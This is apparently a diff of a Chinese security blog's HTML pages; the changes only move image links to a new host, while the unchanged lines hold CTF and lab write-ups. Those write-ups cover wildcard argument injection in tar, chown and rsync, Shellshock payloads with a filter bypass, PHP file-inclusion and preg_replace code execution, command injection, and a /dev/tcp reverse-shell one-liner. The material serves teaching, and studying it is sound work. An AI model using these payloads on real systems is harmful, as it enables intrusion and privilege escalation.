@@ -21,7 +21,7 @@
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;take help&amp;#34;&lt;/span> &amp;gt; --help
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先创建几个文件，其中有一个是&lt;code>--help&lt;/code>，然后使用&lt;code>cat&lt;/code>命令读取文件内容&lt;/p>
@@ -37,31 +37,31 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat --help
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007192.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果按照我们预期的，是不是在第三个&lt;code>cat --help&lt;/code>处应该是要读取&lt;code>—help&lt;/code>文件的内容呢？然而我们执行&lt;code>cat —help&lt;/code>却优先执行了&lt;code>cat&lt;/code>命令的帮助选项，并没有读出&lt;code>—help&lt;/code>里的内容。&lt;/p>
 &lt;p>不仅是&lt;code>cat&lt;/code>，&lt;code>ls&lt;/code>等命令也会优先调用内置&lt;code>--help&lt;/code>选项。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009843.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>以及还有&lt;code>--all&lt;/code>选项。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007699.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>其实讲道理，词法分析把对诸如&lt;code>--help&lt;/code>、&lt;code>--all&lt;/code>等选项优先处理为内置选项输出，看起来并没有任何问题&lt;/p>
 &lt;p>这个技巧叫做&lt;code>Wildcard wildness&lt;/code>，中文有人译为通配符在野。(&lt;code>-all&lt;/code>、&lt;code>--help&lt;/code>可以通过加入&lt;code>./&lt;/code>成&lt;code>./-all&lt;/code>、&lt;code>./--help&lt;/code>来特指这个文件，避免这个问题)&lt;/p>
 &lt;h4 id="example-2">Example 2
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008865.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如图，我们有两个文件，当用&lt;code>rm *&lt;/code>的时候，只删掉了&lt;code>file1&lt;/code>与&lt;code>file2&lt;/code>，并没有删除&lt;code>*&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001503.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>或者使用&lt;code>rm file1 file2 -rf&lt;/code>逐个删除之时，也只删掉了&lt;code>file1&lt;/code>与&lt;code>file2&lt;/code>&lt;/p>
 &lt;p>使用&lt;code>strace rm *&lt;/code>我们可以发现&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005779.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>由于当前目录中存在&lt;code>-rf&lt;/code>文件名，&lt;code>rm&lt;/code>将&lt;code>-rf&lt;/code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上&lt;code>./-rf&lt;/code>进行删除&lt;/p>
@@ -70,16 +70,16 @@ loading="lazy"
 &lt;h4 id="file-owner-hijacking">File Owner Hijacking
 &lt;/h4>&lt;p>现在我们有三个用户，一个&lt;code>zedd&lt;/code>，一个&lt;code>test&lt;/code>，一个&lt;code>root&lt;/code>用户。&lt;/p>
 &lt;p>我们分别用&lt;code>zedd&lt;/code>与&lt;code>test&lt;/code>创建了不同的文件，&lt;code>1.php&lt;/code>与&lt;code>test.php&lt;/code>都属于&lt;code>test&lt;/code>用户的文件，&lt;code>zedd.php&lt;/code>与&lt;code>--reference=zedd.php&lt;/code>均属于&lt;code>zedd&lt;/code>用户的文件。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005137.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后使用&lt;code>root&lt;/code>用户使用&lt;code>chown -R test:test *.php&lt;/code>命令，想把本目录下所有的&lt;code>.php&lt;/code>文件修改为&lt;code>test&lt;/code>用户所有。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008433.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是结果我们可以发现，结果该目录下所有的&lt;code>.php&lt;/code>文件都被修改为了&lt;code>zedd&lt;/code>用户所有，成功“提权”。&lt;/p>
 &lt;p>原理我们可以用&lt;code>strace chown -R zedd:zedd *.php&lt;/code>来看一下（注意这里换了一下，模拟想把&lt;code>.php&lt;/code>文件改变成&lt;code>zedd&lt;/code>用户所有）&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009617.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到&lt;/p>
@@ -104,7 +104,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>&lt;code>--reference=RFILE&lt;/code>这个选项则是使用&lt;code>RFILE&lt;/code>的文件拥有者和用户组来改变文件属性，而不是使用传入的&lt;code>OWNER:GROUP&lt;/code>参数。&lt;/p>
 &lt;p>因此，在这种情况下，&lt;code>chown&lt;/code>的&lt;code>--reference&lt;/code>选项将覆盖指定为&lt;code>root&lt;/code>用户输入的参数&lt;code>zedd:zedd&lt;/code>，把此目录中所有&lt;code>.php&lt;/code>文件的所有者改变与&lt;code>.backdoor.php&lt;/code>的所有者&lt;code>test&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003986.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以，按照这种方法，我们可以劫持&lt;code>root&lt;/code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。&lt;/p>
@@ -118,7 +118,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">--reference&lt;span class="o">=&lt;/span>RFILE use RFILE&lt;span class="err">&amp;#39;&lt;/span>s mode instead of MODE values
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000066.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>与&lt;code>chown&lt;/code>类似，因为有&lt;code>--reference=.backdoor.php&lt;/code>的存在，在使用&lt;code>chmod 000 *&lt;/code>的时候也会把劫持到与&lt;code>.backdoor.php&lt;/code>文件权限一样的权限&lt;/p>
@@ -140,15 +140,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>从帮助文档，我们大致可以从中理解到，&lt;code>--checkpoint=1&lt;/code>可以用来显示信息，&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>可以用来执行命令&lt;/p>
 &lt;p>先尝试构建一个&lt;code>shell.sh&lt;/code>脚本，内容为&lt;code>/usr/bin/id&lt;/code>，以及文件名为&lt;code>--checkpoint=1&lt;/code>与&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>的文件，使用&lt;code>tar -cf test.tar *&lt;/code>把当前目录下所有文件压缩到&lt;code>test.tar&lt;/code>压缩包内&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008945.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可见，&lt;code>/usr/bin/id&lt;/code>已经被成功执行输出。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007928.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>与之前一样，&lt;code>--checkpoint=1&lt;/code>与&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>被作为选项处理&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007550.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: &lt;a class="link" href="https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98" target="_blank" rel="noopener"
@@ -175,7 +175,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>&lt;code>--rsh=COMMAND&lt;/code>又是一个我们可以利用的地方，我们首先创建一个文件名为&lt;code>-e sh shell.c&lt;/code>的文件，然后再创建一个&lt;code>shell.c&lt;/code>文件，污染&lt;code>rsync&lt;/code>参数来实现执行我们在&lt;code>shell.c&lt;/code>中写入的预期命令&lt;/p>
 &lt;p>假设当前目录下我们拥有一个只有&lt;code>root&lt;/code>用户可读的&lt;code>rootfile&lt;/code>文件，由于不能直接输出结果，我们可以构造&lt;code>cat ./rootfile &amp;gt; ./output&lt;/code>，将文件内容读出。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004148.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到的&lt;code>output&lt;/code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行&lt;code>rsync&lt;/code>用户的权限，不是直接的&lt;code>root&lt;/code>权限，这里因为执行命令的是&lt;code>root&lt;/code>权限，所以能读取只有&lt;code>root&lt;/code>用户才能读取的&lt;code>rootfile&lt;/code>文件&lt;/p>
@@ -189,7 +189,7 @@ loading="lazy"
 &lt;/li>
 &lt;li>
 &lt;p>&lt;code>tar&lt;/code>命令需要进入到&lt;code>--checkpoint=1&lt;/code>文件所在的目录内，如果加上绝对路径将会失效，例如&lt;code>tar cf test.tar /var/www/html/*&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005324.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到 shell 处理方式将&lt;code>/home/zedd/Desktop/test&lt;/code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了&lt;/p>
@@ -199,7 +199,7 @@ loading="lazy"
 &lt;/li>
 &lt;li>
 &lt;p>利用&lt;code>chmod u+s /usr/bin/find&lt;/code>提升为&lt;code>root&lt;/code>权限执行，配合&lt;code>find&lt;/code>命令的&lt;code>-exec COMMAND&lt;/code>来执行命令，例如&lt;code>find f1 -exec &amp;quot;whoami&amp;quot; \;&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009998.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -209,7 +209,7 @@ loading="lazy"
 &lt;/h3>&lt;p>这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。&lt;/p>
 &lt;h4 id="echo">Echo
 &lt;/h4>&lt;p>&lt;code>echo *&lt;/code>可以用来显示目录，&lt;code>echo /???g&lt;/code>可以用来探测文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008270.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="ln">ln
@@ -220,7 +220,7 @@ loading="lazy"
 &lt;p>&lt;code>ln&lt;/code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考&lt;a class="link" href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html" target="_blank" rel="noopener"
 >理解Linux硬链接与软链接&lt;/a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用&lt;code>ln -s&lt;/code>创建&lt;/p>
 &lt;p>例如，这里我们根目录下有一个文件内容为&lt;code>flag{xxx}&lt;/code>的名为&lt;code>flag&lt;/code>文件，我们使用&lt;code>ln -s /flag file&lt;/code>，在当前目录下创建一个&lt;code>file&lt;/code>文件链接到&lt;code>/flag&lt;/code>，使用&lt;code>cat file&lt;/code>与&lt;code>php -r &amp;quot;echo file_get_contents('file')&amp;quot; &lt;/code>均可以读取到&lt;code>/flag&lt;/code>的内容。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005445.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这个软链接读取文件内容已经被多次利用&lt;/p>
@@ -262,32 +262,32 @@ env -i X=&amp;rsquo;;() { (a)=&amp;gt;' bash -c &amp;rsquo;echo date&amp;rsquo;;
 &lt;li>重定向读写文件&lt;/li>
 &lt;/ul>
 &lt;p>题目设置为几个功能，一个&lt;code>man&lt;/code>命令的帮助文档&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000217.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>选择了&lt;code>ls&lt;/code>，多了个请求参数&lt;code>file=ls&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009784.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试用其他命令，比如&lt;code>find&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003424.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测&lt;code>eval(&amp;quot;man /bin/&amp;quot; + command)&lt;/code>或者一些其他的目录&lt;/p>
 &lt;p>&lt;code>Tar Tester&lt;/code>界面可以上传压缩包但是并没有解压，只是&lt;code>tar -tvf test.tar&lt;/code>查看压缩包内的内容&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>Cmd Exec&lt;/code>界面只有两个命令，一个&lt;code>ls&lt;/code>，一个&lt;code>env&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000773.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>List files&lt;/code>是个目录列举界面，可以列举几个目录&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008062.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>观察题目，题目 url&lt;code>https://command-executor.hackme.inndy.tw/index.php?func=untar&lt;/code>等均带有&lt;code>func=xxx&lt;/code>参数来展示页面，猜测会有文件包含漏洞，尝试使用&lt;code>func=php://filter/read=convert.base64-encode/resource=index&lt;/code>读取文件内容，成功得到回显&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000836.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>解码得到 &lt;code>index.php&lt;/code>源码&lt;/p>
@@ -772,7 +772,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>接下来我们就可以利用&lt;code>ls.php&lt;/code>来找&lt;code>flag&lt;/code>了，因为&lt;code>ls.php&lt;/code>没什么过滤，所以用&lt;code>func=ls&amp;amp;file=../../../&lt;/code>可以发现根目录下的文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008571.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>接下来就是考虑怎么去读了，&lt;code>man.php&lt;/code>因为有&lt;code>preg_match('/^[\w\-]+$/', $file) !== 1&lt;/code>限制得比较死，&lt;code>untar.php&lt;/code>貌似只有&lt;code>tar -tvf&lt;/code>并没有什么用处，只有&lt;code>cmd.php&lt;/code>给出了一个比较不太寻常的&lt;code>env&lt;/code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到&lt;code>ShellShock&lt;/code>漏洞，并且在&lt;code>index.php&lt;/code>中发现有&lt;/p>
@@ -850,16 +850,16 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们就可以利用&lt;code>putenv&lt;/code>实现参数传递，直接设置&lt;code>User-agent: () { :;}; echo 222222&lt;/code>，发现被 waf&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000803.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>分析 waf 结合漏洞成因，我们可以在最后的&lt;code>};&lt;/code>中间添加一个空格绕过，设置&lt;code>User-Agent: () { :;} ; echo 222222&lt;/code>，成功发现输出 22222 ，我们也可以使用&lt;code>() { _; } &amp;gt;_[$($())] { whoami; }&lt;/code>这个 payload&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002148.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现当前用户为&lt;code>www-data&lt;/code>，而我们之前发现根目录&lt;code>flag&lt;/code>的权限为&lt;code>-r-------- 1 flag root 37 Jan 9 2018 flag&lt;/code>，所以不能直接读取，但是有一个&lt;code>flag-reader&lt;/code>与&lt;code>flag-reader.c&lt;/code>的文件，这应该是题目提示了。因为&lt;code>index.php&lt;/code>又把&lt;code>flag&lt;/code>关键字屏蔽了，我们也不能直接读取&lt;code>flag-reader.c&lt;/code>，但是我们这里可以利用通配符读取，例如使用&lt;code>fla*.c&lt;/code>&lt;/p>
 &lt;p>使用&lt;code>() { _; } &amp;gt;_[$($())] { cat /fla*.c; }&lt;/code>得到&lt;code>flag-reader.c&lt;/code>源码&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006944.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Flag-reader.c:&lt;/p>
@@ -937,13 +937,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot; &lt;/code>直接反弹 shell&lt;/p>
 &lt;p>运行&lt;code>flag-reader&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008222.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就&lt;code>write(1, &amp;quot;Wrong response\n&amp;quot;, 16);&lt;/code>&amp;hellip;&lt;/p>
 &lt;p>然而我在回弹 shell 之后，利用&lt;code>/tmp&lt;/code>可写的权限，貌似有点小问题，一旦&lt;code>cat /tmp/zedd&lt;/code>，链接就断掉了，无奈只能找其他文件夹，发现&lt;code>/run/lock&lt;/code>与&lt;code>/var/tmp&lt;/code>均可读可写，使用&lt;code>/flag-reader flag &amp;gt; /run/lock/zedd &amp;lt; /run/lock/zedd&lt;/code>写入 flag&lt;/p>
 &lt;p>反弹 shell 使用&lt;code>cat&lt;/code>非常容易断掉，最好使用执行的方式，最后得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001695.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="上篇的解释与补充">上篇的解释与补充
@@ -1246,7 +1246,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>跟进得到&lt;code>test.txt&lt;/code>的内容&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006888.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测为文件包含，尝试直接读取&lt;code>flag&lt;/code>被&lt;code>waf&lt;/code>，直接读取&lt;code>https://cat.canhack.me/?file=index.php&lt;/code>&lt;/p>
@@ -1314,7 +1314,7 @@ loading="lazy"
 &lt;p>[TOC]&lt;/p>
 &lt;h2 id="pre">Pre
 &lt;/h2>&lt;p>下载得到一个 iso 后直接用 vmware 装起来，&lt;code>ifconfig&lt;/code>得到 ip ，访问就可以看到主页了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000990.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000990.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="hacking">Hacking
@@ -1687,7 +1687,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005160.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -2187,7 +2187,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003780.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -2220,7 +2220,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008506.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
@@ -2298,7 +2298,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008206.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
@@ -2533,18 +2533,18 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;code>flag&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003356.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003356.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web2-ezweb2">Web2 ezweb2
 &lt;/h2>&lt;p>发现&lt;code>Cookie&lt;/code>里有&lt;code>user=dXNlcg%3D%3D&lt;/code>，base64解码得到&lt;code>user=user&lt;/code>，尝试改为&lt;code>admin&lt;/code>，直接进入到了&lt;code>admin.php&lt;/code>的后台。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000735.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000735.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>随便试了一下，发现是个命令执行。命令执行可以参考我上篇文章，&lt;a class="link" href="https://zeddyu.github.io/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener"
 >巧用命令注入的N种方式&lt;/a>。&lt;/p>
 &lt;p>&lt;code>ls&lt;/code>可以得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005581.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005581.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>随便&lt;code>fuzz&lt;/code>了一下，发现可以用&lt;code>cat&amp;lt;&amp;gt;config.php&lt;/code>直接读取文件，文件内容如下。&lt;/p>
@@ -2658,11 +2658,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>找了几个目录都找不到&lt;code>flag&lt;/code>，看来应该要到列目录才可以，但是又过滤了空格，就没办法用&lt;code>ls ..&lt;/code>这样，但是绕过空格的方法很多，我们这里直接用&lt;code>ls$IFS/&lt;/code>绕过空格。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002011.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002011.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看到&lt;code>flag&lt;/code>文件名字，直接读就好了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006422.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006422.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="总结">总结
@@ -3604,7 +3604,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里没有对&lt;code>ip&lt;/code>进行输入检测，所以我们可以使用&lt;code>;cmd&lt;/code>的方式进行命令注入。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
